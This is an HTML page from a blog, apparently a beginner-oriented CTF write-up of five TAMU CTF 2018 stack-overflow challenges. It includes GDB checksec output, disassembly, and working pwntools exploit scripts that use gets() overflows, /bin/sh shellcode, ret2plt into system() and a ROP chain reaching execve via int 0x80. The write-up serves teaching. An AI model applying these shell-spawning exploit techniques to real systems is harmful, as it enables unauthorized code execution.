@@ -1,0 +1,504 @@
+<!doctype html>
+<html lang="">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>TAMU CTF 2018 - slashb4sh</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="referrer" content="no-referrer">
+    <meta name="description" content="">
+    <meta property="og:site_name" content="slashb4sh" />
+    <meta property="og:locale" content="nn_NO" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="/blog/tamu18/" />
+    <meta property="og:title" content="TAMU CTF 2018" />
+    <meta property="og:image" content="/" />
+    <meta property="og:description" content="" />
+
+    
+        <meta property="twitter:site" content="@twitter.com/slashb4sh">
+    
+
+    <meta property="twitter:title" content="TAMU CTF 2018" />
+    <meta property="twitter:image" content="/" />
+    <meta property="twitter:card" content="summary" />
+    <meta property="twitter:description" content="" />
+
+    
+
+    <link rel="canonical" href="/blog/tamu18/">
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="/css/main.css" />
+
+    
+        <link rel="stylesheet" href="/css/highlight.css" />
+    
+
+    
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.css" integrity="sha256-xbqLYBMsjpuCihs+3Fgp/MFMtPdo2SWKoOjEWOqR4X0=" crossorigin="anonymous" />
+    
+
+    <link rel="shortcut icon"
+          href="/img/favicon.ico">
+
+    <link href='' rel="alternate" type="application/rss+xml" title="slashb4sh" />
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code|Merriweather+Sans:400,700|Merriweather:400,700&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    
+    
+
+    
+
+    
+
+<div class="my-4 my-md-5 header">
+    <div class="container">
+        <div class="row">
+            <div class="col-auto d-none d-md-block">
+                
+            </div>
+            <div class="col-auto align-self-center mr-auto">
+                <a href="/">
+                    <h1 class="font-weight-bold name">
+                        slashb4sh
+                    </h1>
+                </a>
+
+                <ul class="nav nav-primary">
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-blog" href="/blog/">
+                                
+                                Blog
+                            </a>
+                        </li>
+                    
+                        <li class="nav-item">
+                            <a class="text-uppercase nav-link text-about" href="/about/">
+                                
+                                About
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+
+                <ul class="nav nav-secondary">
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div class="content">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    <h1 class="mx-0 mx-md-4">
+                        TAMU CTF 2018
+                    </h1>
+
+                    <div class="mb-4 mb-md-5 meta">
+                        <span class="date" title='Mon Jan 7 2019 13:00:00 UTC'>
+                            January 07, 2019
+                        </span>
+
+                        
+                            
+                        
+
+                        <span class="reading-time middot">
+                            5 minutes
+                        </span>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/ctf">CTF</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/stack">stack</a>
+                                    </li>
+                                
+                                    <li class="d-inline middot">
+                                        <a href="/tags/rop">ROP</a>
+                                    </li>
+                                
+                            </ul>
+                        </div>
+
+                        <div class="d-none d-md-inline tags">
+                            <ul class="list-unstyled d-inline">
+                                
+                                
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="markdown">
+                        
+    
+    <p>This school CTF had a good set of stack based challenges for beginners</p>
+<!-- raw HTML omitted -->
+<h2 id="pwn1">pwn1</h2>
+<p><code>32-bit executable, dynamically linked, not stripped</code></p>
+<p>When you run the executable in the terminal, the program simple asks for an input and checks whether it is the secret it is looking for or not.</p>
+<p>debugging in GDB&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div><p>Going through the assembly code, we can see that see a gets() function. This gives us a chance to corrupt any stack address higher than the stack address where the gets() is to read into. We can also see a call to &lsquo;print_flag&rsquo; function. This call instruction is executed only after a cmp instruction which compares [ebp-0xc] with &lsquo;0xf007ba11&rsquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0804861d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">107</span><span style="color:#f92672">&gt;</span>:	cmp    <span style="color:#66d9ef">DWORD</span> PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0xc</span>],<span style="color:#ae81ff">0xf007ba11</span>
+<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048624</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">114</span><span style="color:#f92672">&gt;</span>:	jne    <span style="color:#ae81ff">0x804862d</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">123</span><span style="color:#f92672">&gt;</span>
+<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x08048626</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">116</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x804854b</span> <span style="color:#f92672">&lt;</span>print_flag<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>The value in the memory location &lsquo;0xc&rsquo;(12) bytes lower than the memory location that is stored in ebp is compared with &lsquo;0xf007ba11&rsquo;. If the compare statement is true it sets the ZF, and jne instruction is not executed and &lsquo;print_flag&rsquo; is called.</p>
+<h4 id="exploit">EXPLOIT</h4>
+<p>Here the gets() function allows us to write into any higher stack memory location. Hence we can write &lsquo;0xf007ba11&rsquo; in the required memory location to get the flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+junk<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">23</span>
+s<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0xf007ba11</span>)
+
+<span style="color:#66d9ef">print</span> junk <span style="color:#f92672">+</span> s
+</code></pre></div><!-- raw HTML omitted -->
+<p><code>32-bit executable, dynamically linked, not stripped</code></p>
+<p>This challenge is similar to last one expect that there is a function &lsquo;print flag&rsquo; that prints the flag.</p>
+<p>debugging in GDB&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div><p>The program simply reads the input and prints it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485d2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">32</span><span style="color:#f92672">&gt;</span>:	lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0xef</span>]
+<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">38</span><span style="color:#f92672">&gt;</span>:	push   eax
+<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x080485d9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x80483d0</span> <span style="color:#f92672">&lt;</span>gets@plt<span style="color:#f92672">&gt;</span>
+</code></pre></div><h4 id="exploit-1">EXPLOIT</h4>
+<p>Again, a vulnerable gets() function is used to read the input. We can simply overwrite the return address of the function and get the flag as &lsquo;print flag&rsquo; function is called.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+ 
+junk<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">243</span>
+flag<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x0804854b</span>)
+ 
+<span style="color:#66d9ef">print</span> junk <span style="color:#f92672">+</span> flag
+</code></pre></div><!-- raw HTML omitted -->
+<p><code>32-bit executable, dynamically linked, not stripped</code></p>
+<p>pwn3 is similar to pwn2 in the way it reads the input, via a gets() function.</p>
+<p>debugging in GDB&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div><p>The program when run gives us a leak of a stack address. This address is the same as the address that gets() reads into.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">0x080484d7</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">&gt;</span>:	lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0xee</span>]
+<span style="color:#ae81ff">0x080484dd</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:	push   eax
+<span style="color:#ae81ff">0x080484de</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">19</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x8048600</span>
+<span style="color:#ae81ff">0x080484e3</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x8048370</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+<span style="color:#ae81ff">0x080484e8</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
+<span style="color:#ae81ff">0x080484eb</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">32</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0xc</span>
+<span style="color:#ae81ff">0x080484ee</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">35</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x8048618</span>
+<span style="color:#ae81ff">0x080484f3</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x8048370</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+<span style="color:#ae81ff">0x080484f8</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
+<span style="color:#ae81ff">0x080484fb</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0xc</span>
+<span style="color:#ae81ff">0x080484fe</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">51</span><span style="color:#f92672">&gt;</span>:	lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0xee</span>]
+<span style="color:#ae81ff">0x08048504</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">57</span><span style="color:#f92672">&gt;</span>:	push   eax
+<span style="color:#ae81ff">0x08048505</span> <span style="color:#f92672">&lt;</span><span style="color:#f92672">+</span><span style="color:#ae81ff">58</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x8048380</span> <span style="color:#f92672">&lt;</span>gets<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+</code></pre></div><h5 id="exploit-2">EXPLOIT</h5>
+<p>As we can see that NX is disabled, the stack is a executable section of memory. We can write opcodes on the stack and then overwrite the return address with the address given to us by the program. So the shellcode is executed and shell is pwned. I used pwntools to receive the leak and add it into my exploit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+ 
+shellcode<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31</span><span style="color:#ae81ff">\xdb</span><span style="color:#ae81ff">\x6a</span><span style="color:#ae81ff">\x17</span><span style="color:#ae81ff">\x58</span><span style="color:#ae81ff">\xcd</span><span style="color:#ae81ff">\x80</span><span style="color:#ae81ff">\xf7</span><span style="color:#ae81ff">\xe3</span><span style="color:#ae81ff">\xb0</span><span style="color:#ae81ff">\x0b</span><span style="color:#ae81ff">\x31</span><span style="color:#ae81ff">\xc9</span><span style="color:#ae81ff">\x51</span><span style="color:#ae81ff">\x68</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x2f</span><span style="color:#e6db74">\</span><span style="color:#e6db74">x 73</span><span style="color:#ae81ff">\x68</span><span style="color:#ae81ff">\x68</span><span style="color:#ae81ff">\x2f</span><span style="color:#ae81ff">\x62</span><span style="color:#ae81ff">\x69</span><span style="color:#ae81ff">\x6e</span><span style="color:#ae81ff">\x89</span><span style="color:#ae81ff">\xe3</span><span style="color:#ae81ff">\xcd</span><span style="color:#ae81ff">\x80</span><span style="color:#e6db74">&#34;</span>
+junk<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">242</span><span style="color:#f92672">-</span>len(shellcode))
+ 
+s<span style="color:#f92672">=</span>process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./pwn3</span><span style="color:#e6db74">&#39;</span>)
+\<span style="color:#75715e">#s=remote(&#39;pwn.ctf.tamu.edu&#39;,4323)</span>
+s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0x</span><span style="color:#e6db74">&#39;</span>)
+b<span style="color:#f92672">=</span>s<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">!</span><span style="color:#e6db74">&#39;</span>)
+  
+b<span style="color:#f92672">=</span>b<span style="color:#f92672">.</span>translate(None,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">!</span><span style="color:#e6db74">&#39;</span>)
+ 
+<span style="color:#66d9ef">print</span> b
+b <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">0x</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span> b
+<span style="color:#66d9ef">print</span> b
+t<span style="color:#f92672">=</span>p32(int(b,<span style="color:#ae81ff">16</span>))
+ 
+s<span style="color:#f92672">.</span>sendline(shellcode <span style="color:#f92672">+</span> junk <span style="color:#f92672">+</span> t)
+s<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ls</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">20</span>)
+s<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">cat flag.txt</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">100</span>)
+ 
+s<span style="color:#f92672">.</span>interactive()
+</code></pre></div><!-- raw HTML omitted -->
+<p><code>32-bit executable, dynamically linked, not stripped</code></p>
+<p>Here we have a menu driven program that has bigger code but the vulnerability is again a gets() function that reads our the choice.</p>
+<p>debugging in GDB&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div><p>We can control the flow of the program by overwriting the return address. We can see PLT addresses of system() as it is used in the code. To pwn the shell we need to call system with a pointer to &ldquo;/bin/sh&rdquo; as the argument.</p>
+<h4 id="exploit-3">EXPLOIT</h4>
+<p>Before calling system we need to somehow get a pointer to &ldquo;/bin/sh&rdquo;. We have a gets() function that can read to any memory location. So we overwrite the return address of the function with gets() and the argument as any address that has read-write permission like from the bss section or the data section. So we can now the write &ldquo;/bin/sh&rdquo; into that address. The return address of read() is right above return address of the function we overwrote. So we can write that stack location with the address of system() and the pointer to &ldquo;/bin/sh&rdquo; as argument. The return address of system() will now be a pointer to &ldquo;/bin/sh&rdquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+junk<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
+system<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x08048430</span>)
+gets<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x08048410</span>)
+shelladdr1<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x0804a030</span>)
+shelladdr2<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x804a034</span>)
+shell1<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+shell2<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/sh</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+
+s<span style="color:#f92672">=</span>process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./pwn4</span><span style="color:#e6db74">&#39;</span>)
+s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">50</span>)
+gdb<span style="color:#f92672">.</span>attach(s,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">b*0x08048782</span><span style="color:#e6db74">&#39;</span>)
+s<span style="color:#f92672">.</span>sendline(junk <span style="color:#f92672">+</span> gets <span style="color:#f92672">+</span> system <span style="color:#f92672">+</span> shelladdr1 <span style="color:#f92672">+</span> shelladdr1)
+s<span style="color:#f92672">.</span>sendline(shell1)
+s<span style="color:#f92672">.</span>send(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ls</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+
+s<span style="color:#f92672">.</span>interactive()
+</code></pre></div><!-- raw HTML omitted -->
+<p><code>32-bit executable, statically linked, not stripped</code></p>
+<p>pwn5 is also a menu driven program. The vulnerability is a gets() function, but the gets() is in a function &lsquo;change_major&rsquo; which is called when the corresponding option is selected.</p>
+<p>debugging in GDB&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre></div><h4 id="exploit-4">EXPLOIT</h4>
+<p>This time there is no system(). The binary is statically linked so we can use the &lsquo;int 0x80&rsquo; instruction to get the shell. to get the shell when executing &lsquo;int 0x80&rsquo; instruction we have to have the reference no. of &lsquo;execve&rsquo; in eax, pointer to &lsquo;/bin/sh&rsquo; in ebx and null pointers in ecx and edx. We have to prepare a rop chain to get everything ready before execution of &lsquo;int 0x80&rsquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+junk<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
+
+int80<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x08071005</span>)
+pop_eax<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x080bc396</span>)
+pop_ebx<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x080481d1</span>)
+pop_ecx<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x080e4325</span>)
+pop_edx<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x0807338a</span>)
+shelladdr1<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x80f0060</span>)
+shelladdr2<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x80f0064</span>)
+shell1<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin</span><span style="color:#e6db74">&#34;</span>
+shell2<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/sh</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+null<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">00</span>)
+refno<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x0b</span>)
+mov_dword_edx_eax<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x0805512b</span>)
+mov<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x080543b6</span>) \<span style="color:#75715e">#mov_dword_ebx_eax_popebx_popesi_popedi</span>
+
+exploit <span style="color:#f92672">=</span> junk <span style="color:#f92672">+</span> pop_eax <span style="color:#f92672">+</span> shell1 <span style="color:#f92672">+</span> pop_ebx <span style="color:#f92672">+</span> shelladdr1 <span style="color:#f92672">+</span> mov <span style="color:#f92672">+</span> shelladdr2 <span style="color:#f92672">+</span> null <span style="color:#f92672">+</span> null <span style="color:#f92672">+</span> pop_eax <span style="color:#f92672">+</span> shell2 <span style="color:#f92672">+</span> mov <span style="color:#f92672">+</span> shelladdr1 <span style="color:#f92672">+</span> null <span style="color:#f92672">+</span> null <span style="color:#f92672">+</span> pop_eax <span style="color:#f92672">+</span> refno <span style="color:#f92672">+</span> pop_ecx <span style="color:#f92672">+</span> null <span style="color:#f92672">+</span> pop_edx <span style="color:#f92672">+</span> null <span style="color:#f92672">+</span> int80
+
+s<span style="color:#f92672">=</span>process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./pwn5</span><span style="color:#e6db74">&#39;</span>)
+s<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">you</span><span style="color:#e6db74">&#39;</span>)
+s<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">are</span><span style="color:#e6db74">&#39;</span>)
+s<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pwned</span><span style="color:#e6db74">&#39;</span>)
+s<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">y</span><span style="color:#e6db74">&#39;</span>)
+s<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
+
+s<span style="color:#f92672">.</span>sendline(exploit)
+
+s<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
+
+
+                    </div>
+                </div>
+
+                
+                    <div class="col-sm-12 col-md-3">
+                        <nav id="TableOfContents" class="sticky-top">
+  <ul>
+    <li><a href="#pwn1">pwn1</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                    </div>
+                
+            </div>
+
+            <div class="row">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    
+                        <div class="navigation">
+                            <div class="row">
+                                <div class="col-12 col-md-6">
+                                    
+                                </div>
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-right">
+                                            <a href="/blog/babyheap/">
+                                                <span class="text">BabyHeap - HITCON CTF 2018</span>
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M360.731,229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1,0s-5.3,13.8,0,19.1l215.5,215.5l-215.5,215.5 c-5.3,5.3-5.3,13.8,0,19.1c2.6,2.6,6.1,4,9.5,4c3.4,0,6.9-1.3,9.5-4l225.1-225.1C365.931,242.875,365.931,234.275,360.731,229.075z" />
+    </svg>
+</span>
+
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                            </div>
+                        </div>
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="my-4 footer">
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 mb-2 text-center text-md-left">
+                    
+
+                    
+                </div>
+            </div>
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 text-center text-md-right">
+                    
+
+                    
+
+                    
+    <a href="https://github.com/github.com/maheshhari"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="GitHub">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M8 0C3.58 0 0 3.582 0 8c0 3.535 2.292 6.533 5.47 7.59.4.075.547-.172.547-.385 0-.19-.007-.693-.01-1.36-2.226.483-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.725-.496.056-.486.056-.486.803.056 1.225.824 1.225.824.714 1.223 1.873.87 2.33.665.072-.517.278-.87.507-1.07-1.777-.2-3.644-.888-3.644-3.953 0-.873.31-1.587.823-2.147-.09-.202-.36-1.015.07-2.117 0 0 .67-.215 2.2.82.64-.178 1.32-.266 2-.27.68.004 1.36.092 2 .27 1.52-1.035 2.19-.82 2.19-.82.43 1.102.16 1.915.08 2.117.51.56.82 1.274.82 2.147 0 3.073-1.87 3.75-3.65 3.947.28.24.54.73.54 1.48 0 1.07-.01 1.93-.01 2.19 0 .21.14.46.55.38C13.71 14.53 16 11.53 16 8c0-4.418-3.582-8-8-8"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+    <a href="https://twitter.com/twitter.com/slashb4sh"
+        target="_blank"
